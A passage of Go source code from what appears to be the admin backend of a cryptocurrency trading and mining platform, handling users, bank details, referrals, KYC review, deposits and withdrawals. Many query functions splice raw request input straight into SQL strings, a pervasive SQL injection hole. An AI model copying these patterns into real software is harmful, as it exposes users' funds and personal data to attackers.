	if v := t.Get("avatar").ToString(); v != "" {
		up["avatar"] = v
	}
	if v := t.Get("withdraw_msg").ToString(); v != "" {
		up["withdraw_msg"] = v
	}
	bank := make(map[string]interface{}, 0)
	if v := t.Get("bankname").ToString(); v != "" {
		bank["bankname"] = v
	}
	if v := t.Get("realname").ToString(); v != "" {
		bank["realname"] = v
	}
	if v := t.Get("account").ToString(); v != "" {
		bank["account"] = v
	}
	if v := t.Get("router_num").ToString(); v != "" {
		bank["router_num"] = v
	}
	if v := t.Get("swift_code").ToString(); v != "" {
		bank["swift_code"] = v
	}
	if v := t.Get("bank_address").ToString(); v != "" {
		bank["bank_address"] = v
	}

	rs := new(AdminResponse)

	if t.Get("avatar").ToString() == "" {
		up["avatar"] = SYSTEM_MODEL.SettingGet("avatar").ToString()
	}
	invite_code := t.Get("invite_code").ToString()
	if invite_code != "" {

		if exists := config.GlobalDB.GetCount(models.DB_TABLE_USER, db.DB_PARAMS{"invite_code": invite_code}); exists > 0 {
			rs.State = ERROR
			rs.Data = "该邀请码已经被使用"
			return rs
		}
	}
	username := t.Get("username").ToString()
	if username == "" {
		rs.State = ERROR
		rs.Data = "用户名不能为空!"
		return rs
	}
	if len(up) == 0 {
		rs.State = ERROR
		rs.Data = "请输入一个要操作的用户信息!"
	}
	var err error
	var uid int
	up["username"] = username
	if v := t.Get("id").ToInt(); v == 0 {
		if invite_code == "" {
			invite_code = models.MODEL_USER.GetInvateCode()
		}
		up["createtime"] = utils.GetNow()
		exists := config.GlobalDB.GetCount(models.DB_TABLE_USER, db.DB_PARAMS{"username": username})
		if exists > 0 {
			rs.State = ERROR
			rs.Data = "该用户已经存在!"
			return rs
		}

		up["invite_code"] = invite_code
		last_id, _ := config.GlobalDB.InsertData(models.DB_TABLE_USER, up)
		if last_id == 0 {
			rs.State = ERROR
			rs.Data = "添加用户失败"
			return rs
		}
		uid = int(last_id)

	} else {
		user := models.MODEL_USER.GetBaseInfo(t.Get("id").ToInt())
		if user == nil {
			rs.State = ERROR
			rs.Data = "该用户不存在!"
			return rs
		}

		if user.UserName != username {
			exists := config.GlobalDB.GetCount(models.DB_TABLE_USER, db.DB_PARAMS{"username": username})
			if exists > 0 {
				rs.State = ERROR
				rs.Data = "该用户已经存在!!!!"
				return rs
			}
		}
		aa := (*db.DB_PARAMS)(unsafe.Pointer(&up))
		models.MODEL_USER.Update(t.Get("id").ToInt(), *aa)
		uid = t.Get("id").ToInt()
	}

	if len(bank) > 0 {
		state := a.UpdateUserBankInfo(uid, bank)
		if !state {
			rs.State = ERROR
			rs.Data = "操作用户银行卡信息失败"
		}
	}
	toptype := t.Get("type").ToInt()
	if toptype == 3 { //清空上级信息
		models.MODEL_USER.Update(uid, db.DB_PARAMS{"parent_order": "", "parent_uid": 0})
		config.GlobalDB.Delete(models.DB_TABLE_USER_LEVEL, db.DB_PARAMS{"uid": uid})
		rs.State = SUCCESS
		rs.Data = "格式化用户上级成功!"
		return rs
	}

	if v := t.Get("parent_code").ToString(); v != "" {
		var topid int

		if toptype == 1 {
			topid = models.MODEL_USER.GetInviteUser(v)
		}
		if toptype == 2 {
			topid = t.Get("parent_code").ToInt()
		}

		if topid == uid {
			rs.State = ERROR
			rs.Data = "自己不能成為自己的上級\n推薦人邀請碼/ID錯誤!"
			return rs
		}
		if topid > 0 {
			a.UpTopInfo(uid, topid)
		} else {
			rs.State = ERROR
			rs.Data = "推荐人邀请码不存在\n 错误!"
			return rs
		}
	}
	if err != nil {
		rs.State = ERROR
		rs.Data = "操作用户信息错误!"
		return rs
	}
	rs.State = SUCCESS
	rs.Data = "操作用户信息成功!"
	return rs
}

func (a *UserModel) UpdateUserBankInfo(uid int, bank map[string]interface{}) bool {
	if uid == 0 {
		return false
	}
	if len(bank) == 0 {
		return false
	}
	cache_id := models.MODEL_USER.MakeCacheId("bank", uid)
	var err error
	if models.MODEL_CREDIT.GetBankInfo(uid) == nil {
		bank["uid"] = uid
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_BANKINFO, bank)
	} else {
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_BANKINFO, bank, db.DB_PARAMS{"uid": uid})
	}

	if err != nil {
		return false
	}

	config.GlobalRedis.Del(models.HASH_USER_BANK, cache_id)
	return true
}

/**
 *	修改用户上级
 */
func (a *UserModel) UpTopInfo(uid int, topid int) {
	Top := models.MODEL_USER.GetBaseInfo(topid)
	if Top == nil {
		return
	}
	var order string
	if Top.ParentOrder != "" && Top.ParentOrder != "0" {
		order = fmt.Sprintf("%d,%d", Top.Id, topid)
	} else {
		order = fmt.Sprintf("%d", topid)
	}
	tmp := strings.Split(order, ",")
	if len(tmp) > 3 {
		tmp = tmp[len(tmp)-3:]
	}
	r := db.DB_PARAMS{"parent_order": strings.Join(tmp, ","), "parent_uid": topid}
	if Top.ChaneelId != "0" && Top.ChaneelId != "" {
		TopChanel := models.MODEL_USER.GetBaseInfo(utils.GetInt(Top.ChaneelId))
		if TopChanel != nil {
			r["channel_id"] = Top.ChaneelId
			r["channel_username"] = TopChanel.Email
			r["channel_level"] = Top.Level + 1

		}
	} else {
		if Top.IsAgent == 1 {
			r["channel_id"] = Top.Id
			r["channel_username"] = Top.Email
			r["channel_level"] = 1
		}
	}
	models.MODEL_USER.Update(uid, r)
	config.GlobalDB.Delete(models.DB_TABLE_USER_LEVEL, db.DB_PARAMS{"uid": uid})
	j := 1
	level_order := make([]string, 0)

	for l := len(tmp) - 1; l >= 0; l-- {
		level_order = append(level_order, tmp[l])
		config.GlobalDB.InsertData(models.DB_TABLE_USER_LEVEL, db.DB_PARAMS{
			"puid":        tmp[l],
			"uid":         uid,
			"level":       j,
			"levle_order": strings.Join(level_order, ","),
		})
		j += 1
	}
}

/**
 *	获取当前用户的asset信息
 */
func (a *UserModel) UserAssetByDirect(uid int) P {
	assetlist, _ := config.GlobalDB.FetchAll(models.DB_TABLE_USERASSETS, db.DB_PARAMS{"uid": uid}, db.DB_FIELDS{})
	p := make(P)
	for _, asset := range assetlist {
		p[asset.Get("coin_symbol").ToString()] = asset.Get("coin_symbol").ToFloat()
	}
	return p
}

func (a *UserModel) UauthDel(id int, tp int) *AdminResponse {
	if id == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确认一个要删除的认证信息!",
		}
	}
	table := map[int]string{
		1: models.DB_TABLE_USERAUTH,
		2: models.DB_TABLE_USERAUTH_LV2,
	}
	one, _ := config.GlobalDB.FetchOne(table[tp], db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
	if one == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "当前认证信息不存在!",
		}
	}
	if _, err := config.GlobalDB.Delete(table[tp], db.DB_PARAMS{"id": id}); err == nil {
		models.MODEL_USER.Update(one.Get("uid").ToInt(), db.DB_PARAMS{"auth_lv": tp - 1})
		return &AdminResponse{
			State: SUCCESS,
			Data:  "删除认证信息成功!",
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "删除认证信息失败!",
	}

}

/**
 *	矿机订单列表
 */
func (a *UserModel) MorderList(rq P) *AdminResponse {
	t := rq.Ts()
	where := make([]string, 0)
	if v := t.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf("(mo.sn like '%%%s%%' OR u.username like '%%%s%%')", v, v))
	}
	if v := t.Get("state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("mo.state = %d", t.Get("state").ToInt()))
	}
	if v := t.Get("pid").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" mo.pid = %d", t.Get("pid").ToInt()))
	}
	if v := t.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf(" mo.createtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}

	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_MINING_ORDER+" as mo", models.DB_TABLE_USER+" as u", "mo.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " and ")}, db.DB_FIELDS{"mo.*", "u.user_type", "u.username"}, utils.Order(t.Get("sort", "mo.id desc, mo.state asc").ToString()), utils.Limit(t.Get("page").ToInt(), t.Get("limit").ToInt()))
	count := config.GlobalDB.JoinCount(models.DB_TABLE_MINING_ORDER+" as mo", models.DB_TABLE_USER+" as u", "mo.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " and ")})
	l := make([]map[string]interface{}, 0)
	for _, item := range list {
		o := make(map[string]interface{}, 0)
		item.SetInterface(&o)
		l = append(l, o)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":        l,
			"count":       count,
			"state_list":  []string{"进行中", "已完成"},
			"minner_type": map[int]string{1: "自定义", 2: "固定金额"},
			"minner_pair": SYSTEM_MODEL.MinnerPair(),
		},
	}
}

func (a *UserModel) StopMinner(id int, pass string) *AdminResponse {
	if id == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请指定一个要停止的订单号",
		}
	}
	if pass != OPERATION_PASSWORD {
		return &AdminResponse{
			State: ERROR,
			Data:  "操作密码错误",
		}
	}
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_MINING_ORDER, db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
	if one == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "当前信息不存在!",
		}
	}
	if _, err := config.GlobalDB.UpdateData(models.DB_TABLE_MINING_ORDER, db.DB_PARAMS{"state": 1, "unlocktime": utils.GetNow()}, db.DB_PARAMS{"id": one.Get("id").ToInt()}); err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "停止订单失败!",
		}
	}
	models.MODEL_USER.AddCredit(one.Get("uid").ToInt(), &models.CreditValue{
		Credit:          one.Get("amount").ToFloat(),
		LockCredit:      0,
		VCrdit:          0,
		LockVCredit:     0,
		UserCoinLogType: models.COIN_LOG_USER_MINING_PROFIT,
		UserCoinLogInfo: models.QueueCreditLog{
			Credit:     one.Get("amount").ToFloat(),
			LockCredit: 0,
			Sn:         one.Get("sn").ToString(),
			CreateTime: utils.GetNow(),
		},
	})
	return &AdminResponse{
		State: SUCCESS,
		Data:  "停止矿机成功!",
	}
}

/**
 *	操作认证信息
 */
func (a *UserModel) UauthOp(rq P, tp int) *AdminResponse {

	t := rq.Ts()
	id := t.Get("id").ToInt()
	if id == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "审核的id不存在!",
		}
	}
	table := map[int]string{
		1: models.DB_TABLE_USERAUTH,
		2: models.DB_TABLE_USERAUTH_LV2,
	}
	one, _ := config.GlobalDB.FetchOne(table[tp], db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
	if one == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "当前审核信息不存在!",
		}
	}
	up := db.DB_PARAMS{"process_state": t.Get("process_state").ToInt(), "reason": t.Get("reason").ToString()}
	if tp == 2 {
		up = db.DB_PARAMS{"state": t.Get("process_state").ToInt(), "reason": t.Get("reason").ToString()}
	}

	//	if t.Get("process_state").ToInt() == 2 {
	up["passtime"] = utils.GetNow()
	//	}
	if _, err := config.GlobalDB.UpdateData(table[tp], up, db.DB_PARAMS{"id": id}); err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "审核当前信息失败！",
		}
	}
	if t.Get("process_state").ToInt() == 1 {
		usup := db.DB_PARAMS{"auth_lv": tp, "credit_coin": 80}
		if tp == 2 {
			usup["credit_coin"] = 100
		}
		models.MODEL_USER.Update(one.Get("uid").ToInt(), usup)
	}

	return &AdminResponse{
		State: SUCCESS,
		Data:  "审核当前信息成功!",
	}

}

/**
 *	用户认证
 */
func (a *UserModel) UserAuthList(rq P) *AdminResponse {
	where := make([]string, 0)
	if v := rq.Ts().Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" (ua.inid like '%%%s%%'  OR ua.realname like '%%%s%%' OR u.username = '%s' OR u.id ='%s')", v, v, v, v))
	}

	if v := rq.Ts().Get("process_state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("  ua.process_state = '%s'", v))
	}
	if v := rq.Ts().Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf(" ua.createtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	sort := ""
	if sort == "" {
		sort = " ua.id desc"
	}
	count := config.GlobalDB.JoinCount("user_auth as ua", "users as u ", "u.id  = ua.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")})
	list, _ := config.GlobalDB.JoinTable("user_auth as ua", "users as u ", "u.id = ua.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{"ua.*", "u.username"}, utils.Order(rq.Ts().Get("sort", "ua.id desc").ToString()), utils.Limit(rq.Ts().Get("page").ToInt(), rq.Ts().Get("limit").ToInt()))
	l := make([]interface{}, 0)
	for _, item := range list {
		e := make(map[string]interface{}, 0)
		item.SetInterface(&e)
		parent := a.GetParentUser(item.Get("uid").ToInt())
		if parent != nil {
			e["parent_name"] = parent.ParentName
		}
		l = append(l, e)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: &P{
			"count":        count,
			"list":         l,
			"process_list": SYSTEM_MODEL.AuthProccess(),
		},
	}
}

/**
 * 获取上级用户
 */
func (u *UserModel) GetParentUser(uid int) *models.UserBaseInfo {
	user := models.MODEL_USER.GetBaseInfo(uid)
	return user
	/*if user != nil && user.ParentUid > 0 {
		return models.MODEL_USER.GetBaseInfo(user.ParentUid)
	}
	return nil*/
}

/**
 *	高级认证
 */
func (u *UserModel) UserAuthDouble(rq P) *AdminResponse {
	where := make([]string, 0)
	t := rq.Ts()
	if v := rq.Ts().Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" (ua.farmily_name like '%%%s%%'  OR ua.address like '%%%s%%'   OR ua.wallet_address like '%%%s%%'  OR u.username = '%s' OR u.id = '%s')", v, v, v, v, v))
	}
	if v := rq.Ts().Get("state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("  ua.state = '%s'", v))
	}
	if v := rq.Ts().Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf(" ua.createtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	count := config.GlobalDB.JoinCount("user_auth_2 as ua", "users as u ", "u.id  = ua.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")})
	list, _ := config.GlobalDB.JoinTable("user_auth_2 as ua", "users as u ", "u.id = ua.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{"ua.*", "u.username"}, utils.Order(t.Get("sort", "ua.id desc").ToString()), utils.Limit(rq.Ts().Get("page").ToInt(), rq.Ts().Get("limit").ToInt()))
	l := make([]interface{}, 0)
	for _, item := range list {
		e := make(map[string]interface{}, 0)
		item.SetInterface(&e)
		l = append(l, e)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: &P{
			"count":         count,
			"list":          l,
			"process_list":  SYSTEM_MODEL.AuthProccess(),
			"relation_list": SYSTEM_MODEL.RelationAuth(),
			"chainList":     SYSTEM_MODEL.ContractList(),
		},
	}
}

// 转入转出操作
func (u *UserModel) TransferOp(rq P) *AdminResponse {
	pdata := rq.Ts()
	state := pdata.Get("state").ToInt()
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_TRANSFER, db.DB_PARAMS{"id": pdata.Get("id").ToInt(), "state": 0}, db.DB_FIELDS{})
	if v := pdata.Get("password").ToString(); v != OPERATION_PASSWORD {
		return &AdminResponse{
			State: ERROR,
			Data:  "操作密码错误",
		}
	}
	if one == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "不存在该订单信息",
		}
	}
	if pdata.Get("money").ToFloat() == 0 && pdata.Get("direction").ToInt() == 1 && state == 1 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请输入用户实际到账金额",
		}
	}

	symbol := strings.ToLower(one.Get("coin_symbol").ToString())
	fmt.Println("symbol", symbol)
	to_priceInfo := 1.0
	if symbol != "usdt" && symbol != "usdc" {
		p := models.MODEL_SYSTEM.GetLastCoinInfo(symbol + "usdt")
		to_priceInfo = p["close"].(float64)
	}
	//资产增减
	asset := &models.Assets{
		Coin:  symbol,          //币种
		Pair:  symbol + "usdt", //交易对
		Price: to_priceInfo,
		Mode:  1,
	}
	//资金日志
	creditlog := &models.QueueCreditLog{
		CoinType:   symbol,
		CreateTime: utils.GetNow(),
	}
	//转入
	if pdata.Get("direction").ToInt() == 1 && state == 1 {
		one["amount"] = pdata.Get("money")
		asset.Num = pdata.Get("money").ToFloat()
		models.MODEL_ASSETS.AddAssets(one.Get("uid").ToInt(), asset) //操作资产信息
		creditlog.Credit = one.Get("amount").ToFloat()

	}
	//转出
	if pdata.Get("direction").ToInt() == 2 && symbol != "usdt" {
		if state == 1 {
			asset.LockNum = one.Get("amount").ToFloat() * -1
		} else { //驳回
			asset.Num = one.Get("amount").ToFloat()
			asset.LockNum = one.Get("amount").ToFloat() * -1
			//资金日志执行相应返还
			creditlog.Credit = one.Get("amount").ToFloat()
			creditlog.LockCredit = one.Get("amount").ToFloat() * -1
		}
		models.MODEL_ASSETS.AddAssets(one.Get("uid").ToInt(), asset) //操作资产信息
	}
	if pdata.Get("direction").ToInt() == 2 && symbol == "usdt" {
		creditlog.Credit = one.Get("amount").ToFloat()
		if state == 1 { //转出 确认的操作
			models.MODEL_USER.AddCredit(one.Get("uid").ToInt(), &models.CreditValue{
				Credit:     0,
				LockCredit: one.Get("amount").ToFloat() * -1,
			})
		} else { //转出 驳回的操作
			creditlog.Credit = one.Get("amount").ToFloat() //记录币种日志
			creditlog.LockCredit = one.Get("amount").ToFloat() * -1
			models.MODEL_USER.AddCredit(one.Get("uid").ToInt(), &models.CreditValue{
				Credit:     one.Get("amount").ToFloat(),
				LockCredit: one.Get("amount").ToFloat() * -1,
			})
		}
	}
	models.MODEL_QUEUE.InputUserQueue(one.Get("uid").ToInt(), models.COIN_LOG_USER_RECHARGE, creditlog) //个人币种的账变要记录

	if state == 1 && symbol == "usdt" { //只统计成功转出USDT操作
		models.MODEL_QUEUE.InputTeamQueue(one.Get("uid").ToInt(), models.TEAM_LOG_WITHDRAW, models.QueueTeamLog{
			Recharge:   one.Get("amount").ToFloat(),
			CreateTime: utils.GetNow(),
		}) //推入团队账变
	}
	//if symbol != "usdt" {
	_, err := config.GlobalDB.UpdateData(models.DB_TABLE_TRANSFER, db.DB_PARAMS{
		"state":      pdata.Get("state").ToInt(),
		"reson":      pdata.Get("reason").ToString(),
		"amount":     one.Get("amount").ToFloat(),
		"info":       pdata.Get("reason").ToString(),
		"finishtime": utils.GetNow(),
	}, db.DB_PARAMS{"id": one.Get("id").ToInt()})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "操作该订单失败!",
		}
	}
	//}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "操作订单成功!",
	}
}

/**
 *	用户资金转入转出
 */
func (u *UserModel) TransferList(rq P) *AdminResponse {
	pdata := rq.Ts()
	direct := pdata.Get("direction").ToInt()
	where := make([]string, 0)
	where = append(where, fmt.Sprintf("t.direction = %d", direct))
	if v := pdata.Get("state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("t.state = %s", v))
	}
	if v := pdata.Get("cointype").ToString(); v != "" {
		where = append(where, fmt.Sprintf("t.coin_symbol = '%s'", strings.ToLower(v)))
	}
	if v := pdata.Get("user_type").ToString(); v != "" {
		where = append(where, fmt.Sprintf("u.user_type = %s", v))
	}
	if v := pdata.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf("(u.username like '%%%s%%' OR t.sn = '%s')", v, v))
	}
	if v := pdata.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("t.createtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	if v := pdata.Get("coin_symbol").ToString(); v != "" {
		where = append(where, fmt.Sprintf("t.coin_symbol= '%s'", v))
	}
	count := config.GlobalDB.JoinCount(models.DB_TABLE_TRANSFER+" as t", models.DB_TABLE_USER+" as u  ", "t.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND ")})

	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_TRANSFER+" as t", models.DB_TABLE_USER+" as u ", "t.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{"t.*", "u.username, u.memo"}, " order by  id desc", utils.Limit(pdata.Get("page").ToInt(), pdata.Get("limit").ToInt()))

	r := make([]map[string]interface{}, 0)

	for _, item := range list {
		i := make(map[string]interface{}, 0)
		item.SetInterface(&i)
		//parent := u.GetParentUser(item.Get("uid").ToInt())
		uinfo := models.MODEL_USER.GetBaseInfo(item.Get("uid").ToInt())

		i["parent_name"] = uinfo.ParentName
		i["user_type"] = uinfo.UserType

		r = append(r, i)
	}

	return &AdminResponse{
		State: SUCCESS,
		Data: &P{
			"count":     count,
			"list":      r,
			"coin_list": SYSTEM_MODEL.TranferCoin(direct),
			"state":     SYSTEM_MODEL.UserStatePair(),
			"user_type": SYSTEM_MODEL.UserTypePair(),
		},
	}
}

/**
 *	充值列表
 */
func (u *UserModel) RechargeList(rq P) *AdminResponse {
	t := rq.Ts()
	where := make([]string, 0)
	if v := t.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" (u.username like '%%%s%%' OR r.sn like' %%%s%%' OR r.uid = '%s') ", v, v, v))
	}
	if v := t.Get("cointype").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" r.cointype = '%s'", v))
	}
	if v := t.Get("state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("r.state = '%s'", v))
	}
	if v := t.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("  r.createtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}

	count := config.GlobalDB.JoinCount("recharge as r ", " users as u", "r.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND ")})

	list, _ := config.GlobalDB.JoinTable("recharge as r ", " users as u", "r.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{
		"u.username",
		"u.credit",
		"u.user_type",
		"r.*",
	}, utils.Order(t.Get("sort", "r.id desc").ToString()), utils.Limit(t.Get("page").ToInt(), t.Get("limit").ToInt()))
	l := make([]interface{}, 0)
	for _, item := range list {
		a := make(map[string]interface{}, 0)
		item.SetInterface(&a)

		//parent := u.GetParentUser(item.Get("uid").ToInt())
		uinfo := models.MODEL_USER.GetBaseInfo(item.Get("uid").ToInt())

		a["parent_name"] = uinfo.ParentName

		l = append(l, a)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":      l,
			"count":     count,
			"coin_list": SYSTEM_MODEL.CoinTypePair(),
			"state":     SYSTEM_MODEL.UserStatePair(),
		},
	}
}

/**
 *	操作充值
 */
func (u *UserModel) OpRecharge(rq P) *AdminResponse {
	t := rq.Ts()
	rs := new(AdminResponse)
	if v := t.Get("id").ToInt(); v == 0 {
		rs.State = ERROR
		rs.Data = "确认状态失败!"
		return rs
	}
	if v := t.Get("password").ToString(); v != OPERATION_PASSWORD {
		rs.State = ERROR
		rs.Data = "操作密码错误!"
		return rs
	}
	rg := u.RechargeOne(t.Get("id").ToInt())
	if rg == nil {
		rs.State = ERROR
		rs.Data = "该充值信息没有找到!"
		return rs
	}
	state := t.Get("state").ToInt()
	if state == 0 {
		rs.State = ERROR
		rs.Data = "进行中的状态无法手动修改!"
		return rs
	}
	var err error
	if state == 1 { //充值成功
		recharge_credit := rg.Credit
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE, db.DB_PARAMS{"state": state, "finishtime": utils.GetNow()}, db.DB_PARAMS{"id": t.Get("id").ToInt()})
		//此处加账变
		if rg.CoinType != "USDT" {
			pair := fmt.Sprintf("%susdt", strings.ToLower(rg.CoinType))
			coinPriceInfo := models.MODEL_SYSTEM.GetLastCoinInfo(pair)
			models.MODEL_ASSETS.AddAssets(rg.Uid, &models.Assets{
				Coin:    strings.ToLower(rg.CoinType),
				Pair:    pair,
				Num:     rg.Credit,
				LockNum: 0,
				Price:   coinPriceInfo["close"].(float64),
				Mode:    1,
			})
			recharge_credit = 0

		}
		models.MODEL_USER.AddCredit(rg.Uid, &models.CreditValue{
			Credit:          recharge_credit,
			LockCredit:      0,
			VCrdit:          0,
			LockVCredit:     0,
			UserCoinLogType: models.COIN_LOG_USER_RECHARGE,
			UserCoinLogInfo: models.QueueCreditLog{
				Credit:     rg.Credit,
				LockCredit: 0,
				Sn:         rg.Sn,
				CoinType:   strings.ToLower(rg.CoinType),
				CreateTime: utils.GetNow(),
			},
			TeamCoinLogType: models.TEAM_LOG_RECHARGE,
			TeamCoinLogInfo: models.QueueTeamLog{
				Recharge:   rg.FactCredit,
				CreateTime: utils.GetNow(),
			},
		})
		models.MODEL_USER.ClearCache(rg.Uid)
	} else { //失败了
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE, db.DB_PARAMS{"state": 2, "reason": t.Get("reason").ToString()}, db.DB_PARAMS{"id": t.Get("id").ToInt()})
	}
	if err != nil {
		rs.State = ERROR
		rs.Data = "操作充值信息失败!"
		return rs
	}
	rs.State = SUCCESS
	rs.Data = "操作成功!"
	return rs
}

/**
 * 用户单条的充值信息
 */
func (u *UserModel) RechargeOne(id int) *models.Recharge {
	if id == 0 {
		return nil
	}
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_RECHARGE, db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
	rg := new(models.Recharge)
	one.SetObj(rg)
	return rg
}

func (u *UserModel) OpuserAssetWallet(rq P) *AdminResponse {
	t := rq.Ts()
	if v := t.Get("id").ToInt(); v == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请指定一个要修改的信息",
		}
	}
	_, err := config.GlobalDB.UpdateData(models.DB_TABLE_USERASSETS, db.DB_PARAMS{"wallet_address": t.Get("wallet_address").ToString()}, db.DB_PARAMS{"id": t.Get("id").ToInt()})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "修改用户钱包信息失败!",
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "修改用户钱包信息成功",
	}
}

func (u *UserModel) UserAssetList(rq P) *AdminResponse {
	t := rq.Ts()
	where := make([]string, 0)

	if v := t.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf("(u.username = '%s' or u.id = '%s' or c.wallet_address like '%%%s%%') ", v, v, v))
	}

	if v := t.Get("cointype").ToString(); v != "" {
		where = append(where, fmt.Sprintf("c.coin_symbol = '%s'", v))
	}
	if v := t.Get("is_trans").ToString(); v != "" {
		where = append(where, fmt.Sprintf("c.is_trans = '%s'", v))
	}

	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_USERASSETS+" as c", models.DB_TABLE_USER+" as u ", " c.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{
		"u.username",
		"u.memo",
		"c.*",
	}, utils.Order(t.Get("sort", " c.id desc").ToString()), utils.Limit(t.Get("page").ToInt(), t.Get("limit").ToInt()))
	count := config.GlobalDB.JoinCount(models.DB_TABLE_USERASSETS+" as c", models.DB_TABLE_USER+" as u ", " c.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND ")})
	rs := make([]map[string]interface{}, 0)
	for _, item := range list {
		i := make(map[string]interface{}, 0)
		item.SetInterface(&i)
		rs = append(rs, i)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":  rs,
			"count": count,
			"coin":  SYSTEM_MODEL.CoinKeyValPair(),
		},
	}

}

/**
 *	用户利润日志
 */
func (u *UserModel) UserProfitLog(uid int) *AdminResponse {
	if uid == 0 {
		return &AdminResponse{
			State: ERROR,
		}
	}
	list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_PROFIT_LOG, db.DB_PARAMS{"uid": uid}, db.DB_FIELDS{})
	count := config.GlobalDB.GetCount(models.DB_TABLE_PROFIT_LOG, db.DB_PARAMS{"uid": uid})
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":  list,
			"count": count,
		},
	}
}

func (u *UserModel) WithdrawList(rq P) *AdminResponse {
	t := rq.Ts()
	where := make([]string, 0)
	if v := t.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" (u.username like '%%%s%%' OR u.id = '%s')", v, v))
	}
	if v := t.Get("cointype").ToString(); v != "" {
		where = append(where, fmt.Sprintf("w.cointype=%s", v))
	}
	if v := t.Get("contract").ToString(); v != "" {
		if v == "1" {
			where = append(where, fmt.Sprintf("w.type='%s'", v))
		} else {
			where = append(where, fmt.Sprintf("w.contract=%s", v))
		}
	}
	if v := t.Get("state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("w.state = %s", t.Get("state").ToString()))
	}
	if v := t.Get("sn").ToString(); v != "" {
		where = append(where, fmt.Sprintf("w.sn = %s", v))
	}
	if v := t.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("w.createtime between  %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_WITHDRAW+" as w", models.DB_TABLE_USER+" as u", "u.id = w.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{"u.username", "u.memo", "u.user_type", "w.*"}, utils.Order(t.Get("sort", "w.id desc").ToString()), utils.Limit(t.Get("page").ToInt(), t.Get("limit").ToInt()))
